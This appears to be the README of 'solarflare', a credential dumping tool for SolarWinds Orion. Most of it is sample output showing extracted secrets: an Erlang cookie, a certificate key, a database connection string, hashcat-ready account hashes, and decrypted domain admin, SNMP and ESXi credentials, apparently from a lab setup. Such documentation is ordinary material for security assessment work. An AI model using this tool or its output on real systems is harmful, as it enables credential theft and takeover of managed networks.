# solarflare

![.NET Build](https://github.com/mubix/solarflare/workflows/.NET%20Build/badge.svg)

Credential Dumping Tool for SolarWinds Orion

Blog post: https://malicious.link/post/2020/solarflare-release-password-dumper-for-solarwinds-orion/

```
============================================
| Collecting RabbitMQ Erlang Cookie
|       Erlang Cookie: abcdefg12456789abcde
============================================
| Collecting SolarWinds Certificate
|       SolarWinds Orion Certificate Found!
|       Subject Name: CN=SolarWinds-Orion
|       Thumbprint  : BE85C6C3AACA8840E166187B6AB8C6BA9DA8DE80
|       Password    : alcvabkajp4
|       Private Key : MIIKHwIBAzCCCd8GCSqGSIb3DQEHAaCCCdAEggn<snip>
============================================
| Collecting Default.DAT file
|       Encrypted: 01000000D08C9DDF0115D<snip>
|       Decrypted: 5D3CE5B08C9201E636BCF<snip>
============================================
| Collecting Database Credentials          |
|       Path to SWNetPerfMon.DB is: C:\Program Files (x86)\SolarWinds\Orion\SWNetPerfMon.DB
|       Connection String: Server=(local)\SOLARWINDS_ORION;Database=SolarWindsOrion;User ID=SolarWindsOrionDatabaseUser;Password=SUPERSECRETPASSWORDHERE
|       Number of database credentials found: 1
============================================
| Connecting to the Database              |
|       Successfully connected to: Server=(local)\SOLARWINDS_ORION;Database=SolarWindsOrion;User ID=SolarWindsOrionDatabaseUser;MultipleActiveResultSets=true
============================================
| DB - Exporting Key Table                 |
|       KeyID: 1
|       Encrypted Key: LmjknGhSXTC<snip>
|       Kind: Aes256
|       Purpose: master
|       Protection Type: 1
|       Protection Value: BE85C6C3AACA8<snip>
|       Protection Details: {}
------------------------------------------------
|       KeyID: 2
|       Encrypted Key: //pj6a4FaCyfv/Rgs<snip>
|       Kind: Aes256
|       Purpose: oldcryptohelper
|       Protection Type: 0
|       Protection Value: 1
|       Protection Details: {"IV":"oj3JCT7Cft<snip>"}
============================================
| DB - Exporting Accounts Table            |
|        Account: _system
|        Password Hash: qE9ClH<snip>
|        Password Salt: XgtO8XNWc/KiIdglGOnxvw==
|        Hashcat Mode 12501: $solarwinds$1$XgtO8XNWc/KiIdglGOnxvw==$qE9ClHDI<snip>
|        Account Enabled: Y
|        Allow Admin: Y
|        Last Login: 12/15/2020
--------------------------------------------
|        Account: Admin
|        Password Hash: IfAEwA7LXxOAH7ORCG0ZYeq<snip>
|        Password Salt: jNhn3i2XtHfY8y4EOmNdiQ==
|        Hashcat Mode 12501: $solarwinds$1$jNhn3i2XtHfY8y4EOmNdiQ==$IfAEwA7LXxOAH7ORCG0ZY<snip>
|        Account Enabled: Y
|        Allow Admin: Y
|        Last Login: 12/02/2020
--------------------------------------------
|        Account: Guest
|        Password Hash: Y/EMuOWMNfCd<snip>
|        Salt is NULL in DB so lowercase username is used: guest
|        Hashcat Mode 12500: $solarwinds$0$guest$Y/EMuOWMNfCd<snip>
|        Account Enabled: N
|        Allow Admin: N
|        Last Login: 12/30/1899
--------------------------------------------
|        Account: iprequest
|        Password Hash: 7zskGWFukuHuwQ<snip>
|        Salt is NULL in DB so lowercase username is used: iprequest
|        Hashcat Mode 12500: $solarwinds$0$iprequest$7zskGWFukuHuwQ<snip>
|        Account Enabled: Y
|        Allow Admin: N
|        Last Login: 01/01/1900
--------------------------------------------
============================================
| DB - Exporting Credentials Table         |
------------------1--------------------------
| Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential
| Name: _system
|       Desc: Cortex Integration
|       Owner: CORE
|               Password: 9dM-5pH/&amp;Y(KU-v
|               Username: _system
------------------1--------------------------
------------------2--------------------------
| Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential
| Name: JobEngine
|       Desc: Job Engine router TCP endpoint credentials
|       Owner: JobEngine
|               Password: +fBByxJFsK+da6ZN2wKvLTKC/PWUzFlfIvvwtW/XqvA=
|               Username: KWPPhiYJmE8+fRF6qlkxulK2tf3t79TQOAk1ywBMVOI=
------------------2--------------------------
------------------3--------------------------
| Type: SolarWinds.Orion.Core.Models.Credentials.SnmpCredentialsV2
| Name: public
|       Desc:
|       Owner: Orion
|               Community: public
------------------3--------------------------
------------------4--------------------------
| Type: SolarWinds.Orion.Core.Models.Credentials.SnmpCredentialsV2
| Name: private
|       Desc:
|       Owner: Orion
|               Community: private
------------------4--------------------------
------------------5--------------------------
| Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential
| Name: Erlang cookie
|       Desc: Erlang clustering cookie
|       Owner: Erlang
|               Password: abcdefg12456789abcde
|               Username: ignored
------------------5--------------------------
------------------6--------------------------
| Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential
| Name: RabbitMQ user account
|       Desc: RabbitMQ user account for Message Bus
|       Owner: RabbitMQ
|               Password: LtVmCrzlTNyWmwxpxJMi
|               Username: orion
------------------6--------------------------
------------------7--------------------------
| Type: SolarWinds.Orion.Core.Models.Credentials.SnmpCredentialsV3
| Name: User: snmpv3user, Context: thisisthecontext
|       Desc:
|       Owner: Orion
|               AuthenticationKeyIsPassword: false
|               AuthenticationPassword: ASDqwe123
|               AuthenticationType: SHA1
|               Context: thisisthecontext
|               PrivacyKeyIsPassword: false
|               PrivacyPassword: ASDqwe123
|               PrivacyType: AES256
|               UserName: snmpv3user
------------------7--------------------------
------------------8--------------------------
| Type: SolarWinds.Orion.Core.Models.Credentials.SnmpCredentialsV3
| Name: User: rootsnmpv3, Context: newcontextv3
|       Desc:
|       Owner: Orion
|               AuthenticationKeyIsPassword: true
|               AuthenticationPassword: ASDqwe123
|               AuthenticationType: MD5
|               Context: newcontextv3
|               PrivacyKeyIsPassword: true
|               PrivacyPassword: ASDqwe123
|               PrivacyType: AES128
|               UserName: rootsnmpv3
------------------8--------------------------
------------------9--------------------------
| Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential
| Name: DomainAdmin
|       Desc:
|       Owner: Orion
|               Password: ASDqwe123
|               Username: SITTINGDUCK\uberuser
------------------9--------------------------
------------------10--------------------------
| Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential
| Name: DomainJoiner
|       Desc:
|       Owner: Orion
|               Password: ASDqwe123
|               Username: superadmin@sittingduck.info
------------------10--------------------------
------------------11--------------------------
| Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential
| Name: vesxi
|       Desc: vesxi
|       Owner: VIM
|               Password: ASDqwe123
|               Username: root
------------------11--------------------------
============================================
============================================
```
